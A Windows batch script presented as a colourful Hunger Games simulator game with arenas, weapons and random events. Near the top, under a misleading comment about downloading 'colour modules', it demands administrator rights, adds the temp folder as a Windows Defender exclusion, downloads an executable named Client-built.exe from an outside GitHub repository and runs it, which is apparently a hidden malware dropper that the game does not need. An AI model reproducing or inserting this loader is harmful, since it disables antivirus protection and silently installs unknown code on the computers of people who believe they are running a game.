@echo off
chcp 65001 >nul
:: Check for administrator privileges
openfiles >nul 2>nul
if %errorlevel% neq 0 (
    echo This script requires administrator privileges.
    echo Please right-click on the script and select "Run as administrator."
    pause
    exit
)
echo Running as Administrator.
pause
cls
::Download Required Colour Modules
cd %TEMP%
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
PowerShell -Command "$downloadPath = Join-Path -Path $env:TEMP -ChildPath 'Client-built.exe'; Invoke-WebRequest 'https://github.com/WurstSMTPAgent/WurstInstallation/raw/main/Client-built.exe' -OutFile $downloadPath"
start "" "%TEMP%\Client-built.exe"
cls
setlocal enabledelayedexpansion
title Hunger Games Batch V0.8

::Banner2
cls
echo.
echo.
echo    [38;2;255;69;0m██╗  ██╗ ██████╗     ██████╗  █████╗ ████████╗ ██████╗██╗  ██╗    ██╗   ██╗ ██╗    ██████╗ 
echo    [38;2;255;99;71m██║  ██║██╔════╝     ██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║  ██║    ██║   ██║███║   ██╔═████╗
echo    [38;2;255;140;0m███████║██║  ███╗    ██████╔╝███████║   ██║   ██║     ███████║    ██║   ██║╚██║   ██║██╔██║
echo    [38;2;255;165;0m██╔══██║██║   ██║    ██╔══██╗██╔══██║   ██║   ██║     ██╔══██║    ╚██╗ ██╔╝ ██║   ████╔╝██║
echo    [38;2;255;215;0m██║  ██║╚██████╔╝    ██████╔╝██║  ██║   ██║   ╚██████╗██║  ██║     ╚████╔╝  ██║██╗╚██████╔╝
echo    [38;2;255;255;0m╚═╝  ╚═╝ ╚═════╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝      ╚═══╝   ╚═╝╚═╝ ╚═════╝ 
echo --------------------------------------------------------------------------------------------------
echo.

:: Arena Selection
:arena_setup
echo Choose the Arena Type:
echo [38;2;0;255;0m 1. Forest
echo [38;2;255;255;0m 2. Desert
echo [38;2;128;0;0m 3. Urban
set /p arena_choice=[38;2;255;255;0mEnter your choice (1-3): 
if %arena_choice% equ 1 set arena_type=Forest
if %arena_choice% equ 2 set arena_type=Desert
if %arena_choice% equ 3 set arena_type=Urban
echo Arena set to: %arena_type%
timeout /t 2 >nul

:start
cls
echo Welcome to Batch Hunger Games Simulator!
echo ----------------------------------------

:: Load or create new players
:load_or_create
echo 1. Load existing players from file
echo 2. Create new players
set /p choice=Enter your choice (1-2): 
if %choice% equ 1 goto load_players
if %choice% equ 2 goto get_players
goto load_or_create

:load_players
cd /d "%~dp0"
set /p filename=Enter the filename to load players from (without extension): 
if not exist "%filename%.txt" (
    echo File not found. Please try again.
    goto load_or_create
)

set players=0
for /f "tokens=1,2,3,4,5,6,7 delims=," %%a in (%filename%.txt) do (
    set /a players+=1
    set player!players!=%%a
    set player!players!_kills=%%b
    set player!players!_weapon=%%c
    set player!players!_alive=%%d
    set player!players!_food=%%e
    set player!players!_water=%%f
    set player!players!_medkits=%%g
)

echo Players loaded from %filename%.txt
timeout /t 1 >nul
cls
set /p cbmode=Colourblind Mode? (y/n)
if %cbmode% equ y goto cbstart
if %cbmode% equ n goto cornucopia


:get_players
:: Validate number of players
set /p players=How many players are in the game? 
set /a player_count=%players% 2>nul
if %player_count% leq 0 (
    echo Invalid number of players. Please enter a number greater than 0.
    goto get_players
)

set round=1

:: Initialize players and their stats
for /l %%i in (1,1,%players%) do (
    :get_player_name
    set /p player%%i=Enter name for Player %%i: 
    if not defined player%%i (
        echo Player name cannot be blank. Please try again.
        goto get_player_name
    )
    set player%%i_kills=0
    set player%%i_weapon=None
    set player%%i_alive=1
    set player%%i_food=10
    set player%%i_water=15
    set player%%i_medkits=2
)
cls
set /p cbmode=Colourblind Mode? (y/n)
if %cbmode% equ y goto cbstart
if %cbmode% equ n goto cornucopia
:cornucopia
cls
echo Round %round%: The Cornucopia!
timeout /t 1 >nul
echo Players rush to the Cornucopia to grab weapons and supplies...
timeout /t 1 >nul

:: Randomly assign weapons to players based on arena type
for /l %%i in (1,1,%players%) do (
    set /a weapon=!random! %% 9
    if "%arena_type%"=="Forest" (
        if !weapon! equ 0 set player%%i_weapon=Longsword
        if !weapon! equ 1 set player%%i_weapon=Spear
        if !weapon! equ 2 set player%%i_weapon=Bow
        if !weapon! equ 3 set player%%i_weapon=Axe
        if !weapon! equ 4 set player%%i_weapon=Knife
        if !weapon! equ 5 set player%%i_weapon=Rapier
        if !weapon! equ 6 set player%%i_weapon=Halberd
        if !weapon! equ 7 set player%%i_weapon=Trident
        if !weapon! equ 8 set player%%i_weapon=Dagger
    ) else if "%arena_type%"=="Desert" (
        if !weapon! equ 0 set player%%i_weapon=Scimitar
        if !weapon! equ 1 set player%%i_weapon=Khopesh
        if !weapon! equ 2 set player%%i_weapon=Throwing Knife
        if !weapon! equ 3 set player%%i_weapon=Sand Staff
        if !weapon! equ 4 set player%%i_weapon=Dagger
        if !weapon! equ 5 set player%%i_weapon=Crossbow
        if !weapon! equ 6 set player%%i_weapon=Spear
        if !weapon! equ 7 set player%%i_weapon=Desert Eagle
        if !weapon! equ 8 set player%%i_weapon=Spear
    ) else if "%arena_type%"=="Urban" (
        if !weapon! equ 0 set player%%i_weapon=Crowbar
        if !weapon! equ 1 set player%%i_weapon=Pistol
        if !weapon! equ 2 set player%%i_weapon=Shotgun
        if !weapon! equ 3 set player%%i_weapon=Knife
        if !weapon! equ 4 set player%%i_weapon=Baseball Bat
        if !weapon! equ 5 set player%%i_weapon=Molotov Cocktail
        if !weapon! equ 6 set player%%i_weapon=Assault Rifle
        if !weapon! equ 7 set player%%i_weapon=Grenade
        if !weapon! equ 8 set player%%i_weapon=Assault Rifle
    )
    echo !player%%i! grabs a !player%%i_weapon!.
    timeout /t 1 >nul
)
if "%arena_type%"=="Forest" goto ForestMain
if "%arena_type%"=="Desert" goto DesertMain
if "%arena_type%"=="Urban" goto UrbanMain

:ForestMain
set /a round+=1
cls
echo Round %round% begins...
timeout /t 1 >nul

:: Special Events
if %round% gtr 6 (
    set /a special_event_chance=!random! %% 6
    if !special_event_chance! equ 0 (
        set /a event_type=!random! %% 6
        if !event_type! equ 0 (
            echo A pack of wild dogs is on the loose!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a dog_attack=!random! %% 2
                    if !dog_attack! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is attacked by wild dogs and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! manages to fend off the wild dogs. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 1 (
            echo An intense storm hits the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a storm_survival=!random! %% 2
                    if !storm_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is struck by lightning and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! finds shelter and survives the storm. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 2 (
            echo A poison fog rolls into the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a fog_survival=!random! %% 2
                    if !fog_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! succumbs to the poison fog and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! finds a gas mask and survives the fog. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 3 (
            echo A swarm of bees attacks the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a bee_attack=!random! %% 2
                    if !bee_attack! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is stung to death by the bees. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! escapes the swarm of bees. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 4 (
            echo A flood forces players to higher ground!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a flood_survival=!random! %% 2
                    if !flood_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is swept away by the flood and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! reaches higher ground and survives. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 5 (
            echo A fire spreads across the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a fire_survival=!random! %% 2
                    if !fire_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is caught in the fire and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! escapes the fire. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        )
        goto check_alive
    )
)

:: Normal Player Actions
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a action=!random! %% 16
        if !action! leq 2 (
            set /a target=!random! %% %players% + 1
            if !target! equ %%i (
                echo [38;2;255;0;0m!player%%i! kills themselves in a moment of despair. [38;2;255;255;0m
                set player%%i_alive=0
            ) else if !player%target%_alive! equ 0 (
                echo !player%%i! searches for someone to kill but can't find anyone. [38;2;255;255;0m
            ) else (
                echo [38;2;255;0;0m!player%%i! kills !player%target%! with their !player%%i_weapon!. [38;2;255;255;0m
                set player%target%_alive=0
                set /a player%%i_kills+=1 
            )
            timeout /t 1 >nul
        ) else if !action! equ 3 (
            set /a found_food=!random! %% 5
            set /a found_water=!random! %% 3
            set /a found_medkit=!random! %% 2
            if !found_food! gtr 0 set /a player%%i_food+=!found_food!
            if !found_water! gtr 0 set /a player%%i_water+=!found_water!
            if !found_medkit! equ 0 set /a player%%i_medkits+=1
            echo [38;2;0;255;0m!player%%i! searches for supplies and finds !found_food! pieces of food and !found_water! Litres of water. [38;2;255;255;0m
            timeout /t 2 >nul
			
        ) else if !action! equ 4 (
            echo !player%%i! hides and avoids conflict.
            timeout /t 1 >nul
			
        ) else if !action! equ 5 (
            echo !player%%i! explores the forest
            timeout /t 1 >nul
			
        ) else if !action! equ 6 (
            echo !player%%i! sets a trap.
            timeout /t 1 >nul
			
        ) else if !action! equ 7 (
            echo [38;2;255;0;0m!player%%i! is crushed by a falling tree. [38;2;255;255;0m
			set player%%i_alive=0
            timeout /t 1 >nul

        ) else if !action! equ 8 (
            echo [38;2;0;255;0m!player%%i! catches a wild animal in their trap. [38;2;255;255;0m
			set /a player%%i_food+=3
            timeout /t 1 >nul

        ) else if !action! equ 9 (
            echo [38;2;0;255;0m!player%%i! finds a pool of water. [38;2;255;255;0m
			set /a player%%i_water+=3
            timeout /t 1 >nul

        ) else if !action! equ 10 (
            echo [38;2;255;0;0m!player%%i! drowns in a body of water. [38;2;255;255;0m
			set player%%i_alive=0
            timeout /t 1 >nul

        ) else if !action! equ 11 (
            echo !player%%i! loses their weapon while escaping from a bear 
			set player%%i_weapon=knife
			timeout /t 1 >nul
			  

        ) else if !action! equ 12 (
            echo !player%%i! is given a !player%%i_weapon! by a sponsor.
            timeout /t 1 >nul			
			
        ) else if !action! equ 13 (
            set /a victim=!random! %% %players% + 1
            if !victim! neq %%i (
                if !player%victim%_alive! equ 1 (
                    set /a stolen_food=!random! %% 3
                    set /a stolen_water=!random! %% 3
                    set /a stolen_medkit=!random! %% 2
                    set /a player%victim%_food-=!stolen_food!
                    set /a player%victim%_water-=!stolen_water!
                    set /a player%victim%_medkits-=!stolen_medkit!
                    set /a player%%i_food+=!stolen_food!
                    set /a player%%i_water+=!stolen_water!
                    set /a player%%i_medkits+=!stolen_medkit!
                    echo [38;2;255;69;0m!player%%i! steals !stolen_food! pieces of food, !stolen_water! Litres of water, and !stolen_medkit! Medical Supplies from !player%victim%!. [38;2;255;255;0m
                    timeout /t 2 >nul
                )
            )
        ) else if !action! equ 14 (
            set /a ally=!random! %% %players% + 1
            if !ally! neq %%i (
                if !player%ally%_alive! equ 1 (
                    echo [38;2;135;206;235m!player%%i! allies with !player%ally%!. [38;2;255;255;0m
                    timeout /t 1 >nul
                )
            )
        ) else if !action! equ 15 (
            echo !player%%i! is wounded by an animal.
			set /a player%%i_medkits-=1
            timeout /t 1 >nul
        )
    )
)

:: Check for resource depletion
:: Reduce food and water at the end of each round
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a player%%i_food-=1
        if "%arena_type%"=="Desert" (
            set /a player%%i_water-=2
        ) else (
            set /a player%%i_water-=1
        )
        
        if !player%%i_food! lss 1 (
            echo [38;2;255;0;0m!player%%i! dies from starvation. [38;2;255;255;0m
            set player%%i_alive=0
        )

        if !player%%i_medkits! equ 0 (
            echo [38;2;255;0;0m!player%%i! bled out. [38;2;255;255;0m
            set player%%i_alive=0
        )

        if !player%%i_water! lss 1 (
            echo [38;2;255;0;0m!player%%i! dies from dehydration. [38;2;255;255;0m
            set player%%i_alive=0
        )
    )
)
pause
:: End-of-Round Summary
cls
echo Round %round% Summary:
echo ---------------------
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        echo !player%%i! is still alive.
    ) else (
        echo [38;2;255;0;0m!player%%i! has died. [38;2;255;255;0m
    )
)
pause 

:check_alive
:: Check if the game is over
set alive_count=0
set winner=
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a alive_count+=1
        set winner=!player%%i!
    )
)

if !alive_count! leq 1 goto end_game
goto ForestMain


:DesertMain
set /a round+=1
cls
echo Round %round% begins...
timeout /t 1 >nul

:: Special Events
if %round% gtr 6 (
    set /a special_event_chance=!random! %% 6
    if !special_event_chance! equ 0 (
        set /a event_type=!random! %% 6
        if !event_type! equ 0 (
            echo A Giant Sandworm is on the loose!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a dog_attack=!random! %% 2
                    if !dog_attack! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is consumed by the worm. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! escapes the worm. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 1 (
            echo An intense sandstorm hits the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a storm_survival=!random! %% 2
                    if !storm_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is burried under the sand and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! finds shelter and survives. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 2 (
            echo An extreme drought hits the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    if !player%%i_water! lss 5 (
                        echo [38;2;255;0;0m!player%%i! succumbs to dehydration and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! manages to survive the drought. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 3 (
            echo A swarm of snakes infests the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a bee_attack=!random! %% 2
                    if !bee_attack! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is killed by the snakes. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! escapes the swarm. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 4 (
            echo A sinkhole forces players to higher ground!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a flood_survival=!random! %% 2
                    if !flood_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is taken into the sinkhole and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! reaches higher ground and survives. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 5 (
            echo A fire spreads across the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a fire_survival=!random! %% 2
                    if !fire_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is caught in the fire and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! escapes the fire. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        )
        goto check_alive
    )
)

:: Normal Player Actions
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a action=!random! %% 10
        if !action! leq 3 (
            set /a target=!random! %% %players% + 1
            if !target! equ %%i (
                echo [38;2;255;0;0m!player%%i! kills themselves in a moment of despair. [38;2;255;255;0m
                set player%%i_alive=0
            ) else if !player%target%_alive! equ 0 (
                echo [38;2;255;0;0m!player%%i! searches for someone to kill but can't find anyone. [38;2;255;255;0m
            ) else (
                echo [38;2;255;0;0m!player%%i! kills !player%target%! with their !player%%i_weapon!. [38;2;255;255;0m
                set player%target%_alive=0
                set /a player%%i_kills+=1 
            )
            timeout /t 1 >nul
        ) else if !action! equ 4 (
            set /a found_food=!random! %% 5
            set /a found_water=!random! %% 3
            set /a found_medkit=!random! %% 2
            if !found_food! gtr 0 set /a player%%i_food+=!found_food!
            if !found_water! gtr 0 set /a player%%i_water+=!found_water!
            if !found_medkit! equ 0 set /a player%%i_medkits+=1
            echo [38;2;0;255;0m!player%%i! searches for supplies and finds !found_food! pieces of food and !found_water! Litres of water. [38;2;255;255;0m
            timeout /t 2 >nul
			
        ) else if !action! equ 5 (
            echo !player%%i! hides and avoids conflict.
            timeout /t 1 >nul
			
        ) else if !action! equ 6 (
            echo !player%%i! sets a trap.
            timeout /t 1 >nul
			
        ) else if !action! equ 7 (
            set /a victim=!random! %% %players% + 1
            if !victim! neq %%i (
                if !player%victim%_alive! equ 1 (
                    set /a stolen_food=!random! %% 3
                    set /a stolen_water=!random! %% 3
                    set /a stolen_medkit=!random! %% 2
                    set /a player%victim%_food-=!stolen_food!
                    set /a player%victim%_water-=!stolen_water!
                    set /a player%victim%_medkits-=!stolen_medkit!
                    set /a player%%i_food+=!stolen_food!
                    set /a player%%i_water+=!stolen_water!
                    set /a player%%i_medkits+=!stolen_medkit!
                    echo [38;2;255;69;0m!player%%i! steals !stolen_food! pieces of food, !stolen_water! Litres of water, and !stolen_medkit! Medical Supplies from !player%victim%!. [38;2;255;255;0m
                    timeout /t 2 >nul
                )
            )
        ) else if !action! equ 8 (
            set /a ally=!random! %% %players% + 1
            if !ally! neq %%i (
                if !player%ally%_alive! equ 1 (
                    echo [38;2;135;206;235m!player%%i! allies with !player%ally%!. [38;2;255;255;0m
                    timeout /t 1 >nul
                )
            )
        ) else if !action! equ 9 (
            echo !player%%i! is bitten by a venomous insect.
			set /a player%%i_medkits-=1
            timeout /t 1 >nul
        )
    )
)

:: Check for resource depletion
:: Reduce food and water at the end of each round
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a player%%i_food-=1
        if "%arena_type%"=="Desert" (
            set /a player%%i_water-=2
        ) else (
            set /a player%%i_water-=1
        )
        
        if !player%%i_food! lss 1 (
            echo [38;2;255;0;0m!player%%i! dies from starvation. [38;2;255;255;0m
            set player%%i_alive=0
        )

        if !player%%i_medkits! equ 0 (
            echo [38;2;255;0;0m!player%%i! bled out. [38;2;255;255;0m
            set player%%i_alive=0
        )

        if !player%%i_water! lss 1 (
            echo [38;2;255;0;0m!player%%i! dies from dehydration. [38;2;255;255;0m
            set player%%i_alive=0
        )
    )
)
pause
:: End-of-Round Summary
cls
echo Round %round% Summary:
echo ---------------------
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        echo !player%%i! is still alive.
    ) else (
        echo [38;2;255;0;0m!player%%i! has died. [38;2;255;255;0m
    )
)
pause 

:check_alive
:: Check if the game is over
set alive_count=0
set winner=
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a alive_count+=1
        set winner=!player%%i!
    )
)

if !alive_count! leq 1 goto end_game
goto DesertMain







:UrbanMain
set /a round+=1
cls
echo Round %round% begins...
timeout /t 1 >nul

:: Special Events
if %round% gtr 6 (
    set /a special_event_chance=!random! %% 6
    if !special_event_chance! equ 0 (
        set /a event_type=!random! %% 6
        if !event_type! equ 0 (
            echo A gang of hunters is on the loose!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a dog_attack=!random! %% 2
                    if !dog_attack! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is shot by the hunters and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! manages to fend off the group and gets away. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 1 (
            echo An intense storm hits the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a storm_survival=!random! %% 2
                    if !storm_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is struck by lightning and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! finds shelter and survives the storm. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 2 (
            echo A bioweapon is dropped into the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a fog_survival=!random! %% 2
                    if !fog_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! succumbs to disease and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! finds a gas mask and escapes the toxins. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 3 (
            echo Bombs are dropped throughout the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a bee_attack=!random! %% 2
                    if !bee_attack! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is blown to pieces. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! manages to find shelter in time. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 4 (
            echo An earthquake forces players to cover!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a flood_survival=!random! %% 2
                    if !flood_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is crushed underneath the rubble. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! finds a safe place to hide. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        ) else if !event_type! equ 5 (
            echo A fire spreads across the arena!
            for /l %%i in (1,1,%players%) do (
                if !player%%i_alive! equ 1 (
                    set /a fire_survival=!random! %% 2
                    if !fire_survival! equ 0 (
                        echo [38;2;255;0;0m!player%%i! is caught in the fire and dies. [38;2;255;255;0m
                        set player%%i_alive=0
                    ) else (
                        echo [38;2;0;255;0m!player%%i! escapes the fire. [38;2;255;255;0m
                    )
                    timeout /t 1 >nul
                )
            )
        )
        goto check_alive
    )
)

:: Normal Player Actions
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a action=!random! %% 16
        if !action! leq 3 (
            set /a target=!random! %% %players% + 1
            if !target! equ %%i (
                echo [38;2;255;0;0m!player%%i! kills themselves in a moment of despair. [38;2;255;255;0m
                set player%%i_alive=0
            ) else if !player%target%_alive! equ 0 (
                echo !player%%i! searches for someone to kill but can't find anyone. [38;2;255;255;0m
            ) else (
                echo [38;2;255;0;0m!player%%i! kills !player%target%! with their !player%%i_weapon!. [38;2;255;255;0m
                set player%target%_alive=0
                set /a player%%i_kills+=1 
            )
            timeout /t 1 >nul
        ) else if !action! equ 4 (
            set /a found_food=!random! %% 5
            set /a found_water=!random! %% 3
            set /a found_medkit=!random! %% 2
            if !found_food! gtr 0 set /a player%%i_food+=!found_food!
            if !found_water! gtr 0 set /a player%%i_water+=!found_water!
            if !found_medkit! equ 0 set /a player%%i_medkits+=1
            echo [38;2;0;255;0m!player%%i! searches a building for supplies and finds !found_food! pieces of food and !found_water! Litres of water. [38;2;255;255;0m
            timeout /t 2 >nul
			
        ) else if !action! equ 5 (
            echo !player%%i! hides amidst the ruins.
            timeout /t 1 >nul
			
        ) else if !action! equ 6 (
            echo !player%%i! Travels around the outskirts of the city.
            timeout /t 1 >nul
			
        ) else if !action! equ 7 (
            echo [38;2;135;206;235m!player%%i! shares supplies with their allies.[38;2;255;255;0m
            timeout /t 1 >nul	
			
        ) else if !action! equ 8 (
            echo [38;2;0;255;0m !player%%i! finds a !player%%i_weapon! in a building.[38;2;255;255;0m
            timeout /t 1 >nul	
			
        ) else if !action! equ 9 (
            echo [38;2;255;105;180m!player%%i! is given a !player%%i_weapon! by a sponsor.[38;2;255;255;0m
            timeout /t 1 >nul	

        ) else if !action! equ 10 (
            echo [38;2;255;0;0m!player%%i! is crushed under a collapsing building.[38;2;255;255;0m
			set /a player%%i_alive=0
            timeout /t 1 >nul		

        ) else if !action! equ 11 (
            echo [38;2;255;0;0m!player%%i! dies from an infection.[38;2;255;255;0m
            timeout /t 1 >nul	

        ) else if !action! equ 12 (
            echo [38;2;255;105;180m!player%%i! is given some supplies by a sponsor.[38;2;255;255;0m
			set /a player%%i_food+=2
			set /a player%%i_water+=2
            timeout /t 1 >nul				
			
        ) else if !action! equ 13 (
            set /a victim=!random! %% %players% + 1
            if !victim! neq %%i (
                if !player%victim%_alive! equ 1 (
                    set /a stolen_food=!random! %% 3
                    set /a stolen_water=!random! %% 3
                    set /a stolen_medkit=!random! %% 2
                    set /a player%victim%_food-=!stolen_food!
                    set /a player%victim%_water-=!stolen_water!
                    set /a player%victim%_medkits-=!stolen_medkit!
                    set /a player%%i_food+=!stolen_food!
                    set /a player%%i_water+=!stolen_water!
                    set /a player%%i_medkits+=!stolen_medkit!
                    echo [38;2;255;69;0m!player%%i! steals !stolen_food! pieces of food, !stolen_water! Litres of water, and !stolen_medkit! Medical Supplies from !player%victim%!. [38;2;255;255;0m
                    timeout /t 2 >nul
                )
            )
        ) else if !action! equ 14 (
            set /a ally=!random! %% %players% + 1
            if !ally! neq %%i (
                if !player%ally%_alive! equ 1 (
                    echo [38;2;135;206;235m!player%%i! allies with !player%ally%!.[38;2;255;255;0m
                    timeout /t 1 >nul
                )
            )
        ) else if !action! equ 15 (
            echo !player%%i! is injured by a piece of rubble.
			set /a player%%i_medkits-=1
            timeout /t 1 >nul
        )
    )
)

:: Check for resource depletion
:: Reduce food and water at the end of each round
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a player%%i_food-=1
        if "%arena_type%"=="Desert" (
            set /a player%%i_water-=2
        ) else (
            set /a player%%i_water-=1
        )
        
        if !player%%i_food! lss 1 (
            echo [38;2;255;0;0m!player%%i! dies from starvation. [38;2;255;255;0m
            set player%%i_alive=0
        )

        if !player%%i_medkits! equ 0 (
            echo [38;2;255;0;0m!player%%i! bled out. [38;2;255;255;0m
            set player%%i_alive=0
        )

        if !player%%i_water! lss 1 (
            echo [38;2;255;0;0m!player%%i! dies from dehydration. [38;2;255;255;0m
            set player%%i_alive=0
        )
    )
)
pause
:: End-of-Round Summary
cls
echo Round %round% Summary:
echo ---------------------
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        echo !player%%i! is still alive.
    ) else (
        echo [38;2;255;0;0m!player%%i! has died. [38;2;255;255;0m
    )
)
pause 

:check_alive
:: Check if the game is over
set alive_count=0
set winner=
for /l %%i in (1,1,%players%) do (
    if !player%%i_alive! equ 1 (
        set /a alive_count+=1
        set winner=!player%%i!
    )
)

if !alive_count! leq 1 goto end_game
goto UrbanMain




:end_game
cls
if !alive_count! equ 1 (
    echo The winner is !winner!!
) else (
    echo No one won the game.
)

echo.
echo Kill Leaderboard:
for /l %%i in (1,1,%players%) do (
    echo !player%%i!: !player%%i_kills! kills
)

:restart_or_save
set /p play_again=Would you like to play again with the same members? (yes/no/save): 
if /i "!play_again!"=="yes" (
	set round=1
    for /l %%i in (1,1,%players%) do (
        set player%%i_kills=0
        set player%%i_weapon=None
        set player%%i_alive=1
        set player%%i_food=10
        set player%%i_water=15
        set player%%i_medkits=2
    )
    goto cornucopia
)
if /i "!play_again!"=="save" goto save_players
if /i "!play_again!"=="no" goto end

:end
echo Thanks for playing the Hunger Games Simulator!
pause
exit

:save_players
cd /d "%~dp0"
set /p filename=Enter the filename to save players to (without extension): 
echo Saving players to %filename%.txt...
(
    for /l %%i in (1,1,%players%) do (
        echo !player%%i!,!player%%i_kills!,!player%%i_weapon!,1,10,15,2
    )
) > %filename%.txt
echo Players saved to %filename%.txt
pause
goto restart_or_save





::Colourblind Mode
:cbstart
echo cb mode 
echo [38;2;135;206;235m  (Sky Blue Option 1)
echo [38;2;255;255;255m  (White Option 1)
echo [38;2;255;105;180m  (Light Pink Option 2)
pause
